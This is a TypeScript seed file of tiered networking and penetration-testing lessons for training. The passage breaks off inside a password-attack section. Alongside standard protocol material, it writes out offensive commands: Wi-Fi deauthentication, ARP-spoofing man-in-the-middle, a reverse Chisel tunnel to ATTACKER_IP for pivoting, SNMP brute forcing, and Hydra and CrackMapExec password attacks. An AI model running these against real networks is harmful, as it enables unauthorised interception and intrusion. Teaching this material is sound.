import type { SeedArticle } from "./types";

export const NETWORKING_ARTICLES: SeedArticle[] = [
  // ── net-fundamentals L0 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 0,
    title: "Networking Fundamentals Overview",
    recommendedLevel: 0,
    sections: [
      {
        heading: "What is networking",
        content: `Networking is the practice of connecting computers so they can communicate. Every web request, file transfer, and remote login relies on layered protocols that route data across networks. The TCP/IP model (RFC 1122) defines how this works in practice: link, internet, transport, and application layers.

For cybersecurity, networking is foundational — you cannot attack or defend what you don't understand. Most vulnerabilities involve protocol weaknesses, misconfigurations, or trust boundaries at the network level.`,
        sortOrder: 0,
      },
      {
        heading: "The OSI and TCP/IP models",
        content: `The OSI model provides a conceptual framework with 7 layers, while TCP/IP (the actual implementation) uses 4:

| OSI Layer | TCP/IP Layer | Examples |
|-----------|-------------|----------|
| 7 Application | Application | HTTP, DNS, SSH |
| 6 Presentation | Application | TLS, encoding |
| 5 Session | Application | Sessions, sockets |
| 4 Transport | Transport | TCP, UDP |
| 3 Network | Internet | IP, ICMP |
| 2 Data Link | Link | Ethernet, ARP |
| 1 Physical | Link | Cables, radio |

In practice, the TCP/IP model matters more. The OSI model is useful as a shared vocabulary for describing where a problem or attack occurs.`,
        sortOrder: 1,
      },
      {
        heading: "Key vocabulary",
        content: `- **IP address**: A numeric identifier for a device on a network (IPv4: 192.168.1.1, IPv6: fe80::1)
- **Subnet**: A logical division of an IP network (e.g., 192.168.1.0/24 = 256 addresses)
- **Port**: A number (0-65535) identifying a specific service on a host (HTTP=80, SSH=22)
- **MAC address**: A hardware identifier for a network interface (e.g., 00:1A:2B:3C:4D:5E)
- **DNS**: Domain Name System — translates domain names to IP addresses
- **Gateway**: The router that forwards traffic between networks
- **NAT**: Network Address Translation — maps private IPs to public IPs`,
        sortOrder: 2,
      },
      {
        heading: "Sources",
        content: `- RFC 1122 (Requirements for Internet Hosts)
- RFC 791 (Internet Protocol)
- Tanenbaum & Wetherall, "Computer Networks" (Pearson)`,
        sortOrder: 3,
      },
    ],
  },

  // ── net-fundamentals L1 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 1,
    title: "Networking Basics Cheatsheet",
    recommendedLevel: 1,
    sections: [
      {
        heading: "IP addressing and subnetting",
        content: `IPv4 addresses are 32-bit numbers written in dotted decimal. CIDR notation specifies the network portion:

\`\`\`
192.168.1.0/24
  Network:   192.168.1.0
  Broadcast: 192.168.1.255
  Usable:    192.168.1.1 - 192.168.1.254 (254 hosts)
  Mask:      255.255.255.0

10.0.0.0/8     → 16,777,214 hosts (RFC 1918 — in the class A range)
172.16.0.0/12  → 1,048,574 hosts  (RFC 1918 — in the class B range)
192.168.0.0/16 → 65,534 hosts     (RFC 1918 — in the class C range, but this is a /16 block)
\`\`\`

Quick subnet math: a /24 has 256 addresses, each additional bit halves it. /25 = 128, /26 = 64, /27 = 32, /28 = 16.`,
        sortOrder: 0,
      },
      {
        heading: "TCP and UDP",
        content: `TCP (Transmission Control Protocol, RFC 793) provides reliable, ordered delivery:

\`\`\`
Three-way handshake:
Client → SYN → Server
Client ← SYN-ACK ← Server
Client → ACK → Server
\`\`\`

UDP (User Datagram Protocol, RFC 768) is connectionless — no handshake, no delivery guarantee. Used for DNS (port 53), DHCP, and real-time applications.

\`\`\`bash
# View active TCP connections
ss -tn

# View listening ports
ss -tlnp

# View UDP listeners
ss -ulnp
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "DNS resolution",
        content: `\`\`\`bash
# Look up A record
dig example.com A +short
# 93.184.216.34

# Look up mail servers
dig example.com MX

# Reverse DNS
dig -x 93.184.216.34

# Use a specific nameserver
dig @8.8.8.8 example.com

# Trace the full resolution path
dig +trace example.com
\`\`\`

DNS records: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), NS (nameserver), TXT (text data), PTR (reverse), SOA (zone authority).`,
        sortOrder: 2,
      },
      {
        heading: "ARP and layer 2",
        content: `ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network:

\`\`\`bash
# View ARP cache
arp -a
ip neighbor show

# ARP has no authentication — ARP spoofing lets an attacker
# redirect traffic on the local network (man-in-the-middle)
\`\`\`

Understanding layer 2 matters for internal network attacks (ARP spoofing, VLAN hopping, MAC flooding).`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- RFC 793 (TCP), RFC 768 (UDP), RFC 791 (IP)
- RFC 1035 (DNS implementation and specification)
- RFC 826 (ARP)
- man pages: dig(1), ss(8), ip(8)`,
        sortOrder: 4,
      },
    ],
  },

  // ── net-fundamentals L2 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 2,
    title: "Networking Protocols in Depth",
    recommendedLevel: 2,
    sections: [
      {
        heading: "TCP connection lifecycle",
        content: `Understanding the full TCP lifecycle is critical for both network analysis and exploitation:

\`\`\`mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: SYN (seq=x)
    S->>C: SYN-ACK (seq=y, ack=x+1)
    C->>S: ACK (ack=y+1)
    Note over C,S: Connection established
    C->>S: Data transfer
    S->>C: ACK
    C->>S: FIN
    S->>C: FIN-ACK
    C->>S: ACK
    Note over C,S: Connection closed
\`\`\`

TCP states observable with \`ss -t\`:
- ESTABLISHED: active data transfer
- TIME_WAIT: connection closed, waiting for stale packets (2*MSL, typically 60s)
- CLOSE_WAIT: remote end closed, local hasn't yet — often indicates a bug
- SYN_RECV: received SYN, sent SYN-ACK — many of these may indicate SYN flood`,
        sortOrder: 0,
      },
      {
        heading: "Packet analysis with tcpdump and Wireshark",
        content: `\`\`\`bash
# Capture traffic on interface eth0
tcpdump -i eth0 -w capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.100

# Filter by port
tcpdump -i eth0 port 80

# Show packet contents in ASCII
tcpdump -i eth0 -A port 80

# Capture only TCP SYN packets (connection initiations)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Read a saved capture
tcpdump -r capture.pcap -n
\`\`\`

Wireshark display filters (different syntax from tcpdump):
- \`http.request.method == "POST"\`
- \`tcp.flags.syn == 1 && tcp.flags.ack == 0\`
- \`dns.qry.name contains "evil"\`
- \`ip.addr == 192.168.1.0/24\``,
        sortOrder: 1,
      },
      {
        heading: "DHCP and network bootstrapping",
        content: `DHCP (Dynamic Host Configuration Protocol, RFC 2131) assigns IP addresses automatically:

\`\`\`
1. Client → DHCPDISCOVER (broadcast)
2. Server → DHCPOFFER (proposed IP, gateway, DNS)
3. Client → DHCPREQUEST (accepts offer)
4. Server → DHCPACK (confirms lease)
\`\`\`

Security implications:
- Rogue DHCP: an attacker runs a DHCP server, assigning their machine as the gateway (man-in-the-middle)
- DHCP starvation: exhaust the address pool with fake MAC addresses (DoS)
- DHCP snooping on managed switches mitigates these attacks`,
        sortOrder: 2,
      },
      {
        heading: "Routing and ICMP",
        content: `\`\`\`bash
# View routing table
ip route show
# default via 192.168.1.1 dev eth0
# 192.168.1.0/24 dev eth0 proto kernel scope link

# Trace route to a host
traceroute -n example.com
# Uses ICMP or UDP to discover each hop

# ICMP types relevant to security:
# Type 0: Echo Reply (ping response)
# Type 3: Destination Unreachable (port/host unreachable)
# Type 8: Echo Request (ping)
# Type 11: Time Exceeded (used by traceroute)
\`\`\`

ICMP can leak information — an unreachable port returns Type 3 Code 3, confirming the host is alive. Many scanners use ICMP for host discovery.`,
        sortOrder: 3,
      },
      {
        heading: "VLANs and network segmentation",
        content: `VLANs (IEEE 802.1Q) logically segment a physical network. Traffic between VLANs must pass through a router, enabling access control.

\`\`\`
VLAN 10 (Servers):     10.0.10.0/24
VLAN 20 (Workstations): 10.0.20.0/24
VLAN 30 (Management):   10.0.30.0/24
\`\`\`

VLAN hopping attacks:
- **Switch spoofing**: attacker negotiates a trunk link, accessing all VLANs
- **Double tagging**: exploit native VLAN handling to send frames to another VLAN

Mitigation: disable DTP (Dynamic Trunking Protocol), set native VLAN to unused ID, explicitly configure access ports.`,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- RFC 793 (TCP), RFC 2131 (DHCP), RFC 792 (ICMP)
- IEEE 802.1Q (VLAN tagging)
- man pages: tcpdump(1), ip-route(8), traceroute(8)
- Wireshark User's Guide: wireshark.org/docs`,
        sortOrder: 5,
      },
    ],
  },

  // ── net-fundamentals L3 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 3,
    title: "Advanced Networking Concepts",
    recommendedLevel: 3,
    sections: [
      {
        heading: "IPv6 networking",
        content: `IPv6 (RFC 8200) uses 128-bit addresses. Key differences from IPv4:

\`\`\`bash
# IPv6 address format
2001:0db8:85a3:0000:0000:8a2e:0370:7334
# Compressed: 2001:db8:85a3::8a2e:370:7334

# Link-local (always present, starts with fe80::)
fe80::1%eth0

# View IPv6 addresses
ip -6 addr show

# IPv6 ping
ping6 fe80::1%eth0

# IPv6 neighbor discovery (replaces ARP)
ip -6 neighbor show
\`\`\`

Security implications: many networks have IPv6 enabled but unmonitored. Attackers can use IPv6 for covert channels, or exploit SLAAC (Stateless Address Autoconfiguration) for man-in-the-middle attacks via rogue router advertisements.`,
        sortOrder: 0,
      },
      {
        heading: "TLS and certificate infrastructure",
        content: `TLS (Transport Layer Security) encrypts application-layer traffic. The handshake:

\`\`\`mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: ClientHello (supported ciphers, TLS version)
    S->>C: ServerHello (chosen cipher) + Certificate
    Note over C: Verify certificate chain
    C->>S: Key exchange (ECDHE)
    Note over C,S: Both derive session keys
    C->>S: Finished (encrypted)
    S->>C: Finished (encrypted)
    Note over C,S: Application data (encrypted)
\`\`\`

\`\`\`bash
# Inspect a server's TLS certificate
openssl s_client -connect example.com:443 -servername example.com

# Check certificate details
echo | openssl s_client -connect example.com:443 2>/dev/null | \\
  openssl x509 -text -noout

# Test for weak ciphers
nmap --script ssl-enum-ciphers -p 443 example.com
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Network address translation deep dive",
        content: `NAT (RFC 3022) translates between private and public IP addresses. Types:

- **SNAT (Source NAT)**: Changes source IP of outgoing packets — home routers do this
- **DNAT (Destination NAT)**: Changes destination IP of incoming packets — port forwarding
- **PAT (Port Address Translation)**: Many internal IPs share one public IP via port mapping

\`\`\`bash
# View NAT table on Linux (nftables)
nft list table ip nat

# DNAT example: forward port 8080 to internal server
nft add rule ip nat prerouting tcp dport 8080 dnat to 192.168.1.100:80

# SNAT for outgoing traffic
nft add rule ip nat postrouting oifname "eth0" masquerade
\`\`\`

NAT complicates network forensics — the same public IP may be used by hundreds of internal hosts.`,
        sortOrder: 2,
      },
      {
        heading: "Wireless networking security",
        content: `802.11 (Wi-Fi) adds an air interface with unique attack vectors:

| Protocol | Year | Security |
|----------|------|----------|
| WEP | 1999 | Broken — crackable in minutes |
| WPA | 2003 | TKIP — deprecated, vulnerabilities |
| WPA2 | 2004 | AES-CCMP — still widespread |
| WPA3 | 2018 | SAE handshake — recommended |

\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture WPA handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth to force reconnection (capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "DNS security and attacks",
        content: `DNS was designed without authentication. Common attacks:

- **DNS spoofing/cache poisoning**: Inject false DNS responses
- **DNS tunneling**: Exfiltrate data encoded in DNS queries
- **DNS zone transfer**: Extract all records from misconfigured nameservers

\`\`\`bash
# Attempt zone transfer
dig @ns1.example.com example.com AXFR

# Check for DNSSEC
dig example.com +dnssec

# Detect DNS tunneling (unusually long subdomain labels)
# Normal: www.example.com
# Tunnel: aGVsbG8gd29ybGQ.tunnel.evil.com
\`\`\`

Defenses: DNSSEC (RFC 4033-4035) adds cryptographic signatures to DNS records. DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) encrypt queries.`,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- RFC 8200 (IPv6), RFC 8446 (TLS 1.3), RFC 3022 (NAT)
- RFC 4033-4035 (DNSSEC)
- IEEE 802.11 specification
- NIST SP 800-153 (Guidelines for Securing Wireless LANs)
- man pages: openssl(1), nft(8)`,
        sortOrder: 5,
      },
    ],
  },

  // ── net-fundamentals L4 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 4,
    title: "Network Protocol Internals",
    recommendedLevel: 4,
    sections: [
      {
        heading: "TCP congestion control and performance",
        content: `TCP congestion control (RFC 5681) manages flow to avoid overwhelming the network. Key algorithms:

- **Slow Start**: exponential growth until threshold
- **Congestion Avoidance**: linear growth after threshold
- **Fast Retransmit**: retransmit on 3 duplicate ACKs
- **Fast Recovery**: avoid slow start after fast retransmit

Modern algorithms: CUBIC (Linux default), BBR (Google, measures bandwidth and RTT directly).

\`\`\`bash
# View current congestion control algorithm
sysctl net.ipv4.tcp_congestion_control
# net.ipv4.tcp_congestion_control = cubic

# Switch to BBR
sysctl -w net.ipv4.tcp_congestion_control=bbr

# Monitor TCP statistics
ss -ti
# Shows: rto, rtt, cwnd, ssthresh, bytes_sent, etc.
\`\`\`

Security relevance: TCP reset attacks (sending spoofed RST packets to tear down connections), and SYN floods exploit the connection state machine.`,
        sortOrder: 0,
      },
      {
        heading: "BGP and internet routing",
        content: `BGP (Border Gateway Protocol, RFC 4271) is the routing protocol of the internet. Autonomous Systems (AS) exchange routing information:

\`\`\`bash
# Look up AS for an IP
whois -h whois.radb.net 93.184.216.34

# View BGP routes (using public looking glass)
# bgp.tools, bgpview.io

# Check route origin with RPKI
rpki-client -j
\`\`\`

BGP hijacking: an AS announces routes for IP prefixes it doesn't own, redirecting traffic. RPKI (Resource Public Key Infrastructure, RFC 6480) validates route origins but adoption is still incomplete.

Famous incidents: Pakistan accidentally hijacked YouTube's prefix (2008), causing a global outage.`,
        sortOrder: 1,
      },
      {
        heading: "Network protocol dissection with Scapy",
        content: `Scapy (Python library) lets you craft, send, and analyze packets at any layer:

\`\`\`python
from scapy.all import *

# Craft a TCP SYN packet
syn = IP(dst="10.0.0.1")/TCP(dport=80, flags="S")
response = sr1(syn, timeout=2)

# ARP scan
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
             timeout=2, iface="eth0")
for snd, rcv in ans:
    print(f"{rcv.psrc} -> {rcv.hwsrc}")

# DNS query
dns = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns)
print(response[DNS].an.rdata)

# ICMP traceroute
for ttl in range(1, 30):
    pkt = IP(dst="example.com", ttl=ttl)/ICMP()
    reply = sr1(pkt, timeout=1, verbose=0)
    if reply:
        print(f"{ttl}: {reply.src}")
        if reply.src == "93.184.216.34":
            break
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Network tunneling and encapsulation",
        content: `Tunneling encapsulates one protocol inside another:

\`\`\`bash
# SSH tunnel (local port forwarding)
ssh -L 8080:internal-server:80 jump-host
# Access internal-server:80 via localhost:8080

# SSH dynamic proxy (SOCKS)
ssh -D 9050 jump-host
# Configure browser to use SOCKS5 proxy at localhost:9050

# GRE tunnel
ip tunnel add gre1 mode gre remote 203.0.113.1 local 198.51.100.1
ip link set gre1 up
ip addr add 10.0.0.1/30 dev gre1

# VXLAN (overlay networking for containers/VMs)
ip link add vxlan0 type vxlan id 100 dstport 4789 remote 10.0.0.2
\`\`\`

Tunneling is used legitimately (VPNs, container networking) and offensively (pivoting through compromised hosts, data exfiltration through allowed protocols).`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- RFC 5681 (TCP Congestion Control)
- RFC 4271 (BGP), RFC 6480 (RPKI)
- Scapy documentation: scapy.net
- man pages: ssh(1), ip-tunnel(8)`,
        sortOrder: 4,
      },
    ],
  },

  // ── net-fundamentals L5 ─────────────────────────────────────────────────
  {
    competencyId: "net-fundamentals",
    depthTier: 5,
    title: "Network Internals and Edge Cases",
    recommendedLevel: 5,
    sections: [
      {
        heading: "TCP/IP stack implementation details",
        content: `The Linux networking stack processes packets through a well-defined pipeline:

\`\`\`
Incoming:
NIC → Driver → NAPI poll → netfilter PREROUTING → routing decision
  → local: netfilter INPUT → socket → application
  → forward: netfilter FORWARD → netfilter POSTROUTING → NIC

Outgoing:
Application → socket → routing → netfilter OUTPUT → netfilter POSTROUTING → NIC
\`\`\`

Key data structures:
- \`sk_buff\` (socket buffer): the kernel's packet representation, containing headers, data, and metadata
- \`net_device\`: represents a network interface
- \`sock\`: represents a socket endpoint

\`\`\`bash
# View kernel network stack statistics
cat /proc/net/snmp
cat /proc/net/tcp  # raw TCP connection table
cat /proc/net/udp

# Kernel packet drops
dropwatch -l kas
\`\`\``,
        sortOrder: 0,
      },
      {
        heading: "XDP and high-performance packet processing",
        content: `XDP (eXpress Data Path) processes packets at the driver level before the kernel networking stack, enabling line-rate filtering:

\`\`\`c
// XDP program: drop packets from a specific IP
SEC("xdp")
int xdp_drop_ip(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;

    // Drop packets from 10.0.0.100
    if (ip->saddr == htonl(0x0A000064)) return XDP_DROP;

    return XDP_PASS;
}
\`\`\`

\`\`\`bash
# Load XDP program
ip link set dev eth0 xdp obj filter.o sec xdp

# View XDP statistics
bpftool prog show
\`\`\`

XDP can process millions of packets per second per core, making it suitable for DDoS mitigation at the edge.`,
        sortOrder: 1,
      },
      {
        heading: "Protocol edge cases and exploits",
        content: `Several protocol-level quirks have been exploited historically:

**TCP sequence prediction** (RFC 6528): Predictable ISNs (Initial Sequence Numbers) allow blind spoofing. Modern kernels use RFC 6528-compliant random ISNs.

**IP fragmentation attacks**: Overlapping fragments can bypass firewalls that only inspect the first fragment. The teardrop attack sent malformed overlapping fragments that crashed Windows kernels.

**TCP simultaneous open**: Both sides send SYN simultaneously — valid per RFC 793 but rarely tested, can confuse stateful firewalls.

**ICMP redirect abuse**: ICMP Type 5 tells a host to use a different gateway. An attacker on the local network can redirect traffic through their machine. Mitigated by \`net.ipv4.conf.all.accept_redirects = 0\`.

**DNS rebinding**: Attacker's DNS server alternates between their IP and an internal IP, tricking the browser's same-origin policy.`,
        sortOrder: 2,
      },
      {
        heading: "Network performance analysis",
        content: `\`\`\`bash
# Measure bandwidth
iperf3 -s  # server
iperf3 -c 10.0.0.1 -t 30  # client, 30 seconds

# Latency under load (bufferbloat detection)
irtt client -d 30s 10.0.0.1

# TCP retransmission rate
ss -ti | grep retrans

# Network stack tuning for high throughput
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
sysctl -w net.ipv4.tcp_wmem="4096 65536 16777216"
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- Linux kernel networking documentation: kernel.org/doc/html/latest/networking
- RFC 6528 (Defending Against Sequence Number Attacks)
- RFC 8200 (IPv6 Specification)
- XDP documentation: kernel.org/doc/html/latest/networking/af_xdp.html
- Stevens, "TCP/IP Illustrated, Volume 1" (Addison-Wesley)`,
        sortOrder: 4,
      },
    ],
  },

  // ── net-attacks L0 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 0,
    title: "Network Enumeration Overview",
    recommendedLevel: 0,
    sections: [
      {
        heading: "What is network enumeration",
        content: `Network enumeration is the process of discovering hosts, open ports, running services, and their versions on a target network. It's the first active step in a penetration test — after passive reconnaissance, you probe the network to map the attack surface.

The goal is to answer: what is running, where, and what version? This information drives vulnerability identification and exploitation planning.`,
        sortOrder: 0,
      },
      {
        heading: "Why enumeration matters",
        content: `- A single overlooked open port can be the entry point for a full compromise
- Service versions map directly to known CVEs — a service running Apache 2.4.49 is vulnerable to path traversal (CVE-2021-41773)
- Network topology understanding is essential for lateral movement planning
- Enumeration findings feed into every subsequent phase: vulnerability assessment, exploitation, post-exploitation`,
        sortOrder: 1,
      },
      {
        heading: "Key vocabulary",
        content: `- **Host discovery**: Finding which IP addresses have live hosts
- **Port scanning**: Determining which ports are open on a host
- **Service detection**: Identifying what software is running on open ports
- **Banner grabbing**: Reading the identification string a service sends on connection
- **Fingerprinting**: Identifying the operating system or application version
- **Pivoting**: Using a compromised host to scan and attack otherwise unreachable networks`,
        sortOrder: 2,
      },
      {
        heading: "Sources",
        content: `- PTES (Penetration Testing Execution Standard): pentest-standard.readthedocs.io
- OWASP Testing Guide v4.2, Chapter 4 (Information Gathering)
- Nmap documentation: nmap.org/book`,
        sortOrder: 3,
      },
    ],
  },

  // ── net-attacks L1 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 1,
    title: "Network Scanning Basics",
    recommendedLevel: 1,
    sections: [
      {
        heading: "Host discovery with Nmap",
        content: `\`\`\`bash
# Ping sweep (ICMP echo + TCP SYN to 443 + ACK to 80)
nmap -sn 192.168.1.0/24

# ARP scan on local network (fastest, most reliable)
nmap -sn -PR 192.168.1.0/24

# Skip host discovery (scan even if host appears down)
nmap -Pn 10.0.0.1

# Discover hosts with specific probes
nmap -sn -PE -PP -PM 10.0.0.0/24
# -PE: ICMP echo, -PP: ICMP timestamp, -PM: ICMP netmask
\`\`\`

On a local network, ARP scanning is the most reliable method — it can't be blocked without breaking networking. On remote networks, combine ICMP and TCP probes.`,
        sortOrder: 0,
      },
      {
        heading: "Port scanning techniques",
        content: `\`\`\`bash
# TCP SYN scan (default, stealthy — doesn't complete handshake)
nmap -sS 10.0.0.1

# TCP connect scan (full handshake — use when you can't do SYN)
nmap -sT 10.0.0.1

# UDP scan (much slower — no handshake to confirm)
nmap -sU 10.0.0.1

# Scan specific ports
nmap -p 22,80,443 10.0.0.1

# Scan top 1000 ports (default)
nmap 10.0.0.1

# Scan all 65535 ports
nmap -p- 10.0.0.1

# Fast scan (top 100 ports)
nmap -F 10.0.0.1
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Service and version detection",
        content: `\`\`\`bash
# Service version detection
nmap -sV 10.0.0.1

# OS detection
nmap -O 10.0.0.1

# Aggressive scan (version, scripts, OS, traceroute)
nmap -A 10.0.0.1

# Example output:
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
# 80/tcp  open  http     Apache httpd 2.4.52
# 443/tcp open  ssl/http nginx 1.18.0
# 3306/tcp open mysql    MySQL 8.0.33
\`\`\`

Version strings map to CVEs. Always note exact versions — \`Apache 2.4.49\` vs \`Apache 2.4.52\` can be the difference between vulnerable and patched.`,
        sortOrder: 2,
      },
      {
        heading: "Quick enumeration scripts",
        content: `\`\`\`bash
# Nmap Scripting Engine (NSE) — common scripts
nmap --script=default 10.0.0.1
nmap --script=vuln 10.0.0.1
nmap --script=http-enum 10.0.0.1

# Banner grabbing with netcat
nc -nv 10.0.0.1 22
# SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1

# Quick HTTP check with curl
curl -I http://10.0.0.1
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- Nmap Reference Guide: nmap.org/book/man.html
- Nmap NSE documentation: nmap.org/nsedoc
- man pages: nmap(1), nc(1), curl(1)`,
        sortOrder: 4,
      },
    ],
  },

  // ── net-attacks L2 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 2,
    title: "Network Enumeration in Depth",
    recommendedLevel: 2,
    sections: [
      {
        heading: "SMB enumeration",
        content: `SMB (Server Message Block) is prevalent on Windows networks and frequently misconfigured:

\`\`\`bash
# List shares
smbclient -L //10.0.0.1 -N

# Connect to a share
smbclient //10.0.0.1/share -U username

# Enumerate with enum4linux-ng
enum4linux-ng -A 10.0.0.1

# Nmap SMB scripts
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 10.0.0.1

# CrackMapExec for mass enumeration
crackmapexec smb 10.0.0.0/24

# Check for null session
rpcclient -U "" -N 10.0.0.1
rpcclient $> enumdomusers
\`\`\`

Common findings: anonymous/guest access to shares, writable shares, credentials in shared files, SMBv1 enabled (vulnerable to EternalBlue).`,
        sortOrder: 0,
      },
      {
        heading: "SNMP enumeration",
        content: `SNMP (Simple Network Management Protocol) often uses default community strings:

\`\`\`bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.1

# Walk the MIB tree with a known community string
snmpwalk -v2c -c public 10.0.0.1

# Extract specific info
# System description
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.1.1

# Running processes
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.25.4.2.1.2

# Network interfaces
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.2.2.1.2
\`\`\`

SNMP can reveal system info, running processes, network configuration, and even credentials in some implementations.`,
        sortOrder: 1,
      },
      {
        heading: "LDAP and Active Directory enumeration",
        content: `LDAP (port 389/636) is the directory service for Active Directory:

\`\`\`bash
# Anonymous LDAP query
ldapsearch -x -H ldap://10.0.0.1 -b "DC=corp,DC=local"

# With credentials
ldapsearch -x -H ldap://10.0.0.1 -D "user@corp.local" -w password \\
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Nmap LDAP scripts
nmap --script=ldap-search -p 389 10.0.0.1

# Extract password policy
ldapsearch -x -H ldap://10.0.0.1 -b "DC=corp,DC=local" \\
  "(objectClass=domainDNS)" minPwdLength maxPwdAge lockoutThreshold
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Web service enumeration",
        content: `\`\`\`bash
# Directory brute-forcing
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt

# With ffuf (faster, more flexible)
ffuf -u http://10.0.0.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Virtual host enumeration
ffuf -u http://10.0.0.1 -H "Host: FUZZ.example.com" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -fs 0

# API endpoint discovery
ffuf -u http://10.0.0.1/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Technology fingerprinting
whatweb http://10.0.0.1
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Output management",
        content: `Always save scan results for documentation and later analysis:

\`\`\`bash
# Nmap output formats
nmap -sV -oA scan_results 10.0.0.0/24
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Convert Nmap XML to HTML
xsltproc scan_results.xml -o report.html

# Parse Nmap XML with Python
from libnmap.parser import NmapParser
report = NmapParser.parse_fromfile("scan_results.xml")
for host in report.hosts:
    for service in host.services:
        print(f"{host.address}:{service.port} {service.service} {service.banner}")
\`\`\``,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- Nmap Reference Guide: nmap.org/book/man.html
- enum4linux-ng: github.com/cddmp/enum4linux-ng
- SecLists: github.com/danielmiessler/SecLists
- PTES Technical Guidelines (Information Gathering)
- man pages: smbclient(1), ldapsearch(1), snmpwalk(1)`,
        sortOrder: 5,
      },
    ],
  },

  // ── net-attacks L3 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 3,
    title: "Advanced Network Attacks",
    recommendedLevel: 3,
    sections: [
      {
        heading: "Man-in-the-middle attacks",
        content: `MitM attacks intercept traffic between two parties. Common techniques on local networks:

\`\`\`bash
# ARP spoofing with arpspoof
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# Tells .100 that we are the gateway (.1)

# With Bettercap (modern, scriptable)
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
\`\`\`

Once positioned as MitM, you can:
- Capture credentials sent in cleartext (HTTP, FTP, Telnet)
- Perform SSL stripping (downgrade HTTPS to HTTP)
- Inject content into HTTP responses
- Capture NTLM/NTLMv2 hashes from SMB and HTTP authentication`,
        sortOrder: 0,
      },
      {
        heading: "Pivoting through compromised hosts",
        content: `When you compromise a host on a network, use it to reach otherwise inaccessible networks:

\`\`\`bash
# SSH local port forwarding
ssh -L 9050:10.10.10.5:445 user@pivot-host
# Now access 10.10.10.5:445 via localhost:9050

# SSH dynamic SOCKS proxy
ssh -D 1080 user@pivot-host
# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24

# Chisel (when SSH isn't available)
# On attacker:
chisel server --reverse --port 8000
# On pivot host:
chisel client ATTACKER_IP:8000 R:socks

# Double pivot (through two hosts)
ssh -J user@hop1 user@hop2 -D 1080
\`\`\`

\`\`\`
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Password attacks on network services",
        content: `\`\`\`bash
# Hydra — brute force network logins
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P passwords.txt 10.0.0.1 ftp
hydra -l admin -P passwords.txt 10.0.0.1 http-post-form \\
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# CrackMapExec — password spraying across a network
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2024!'

# Medusa
medusa -h 10.0.0.1 -u admin -P passwords.txt -M ssh
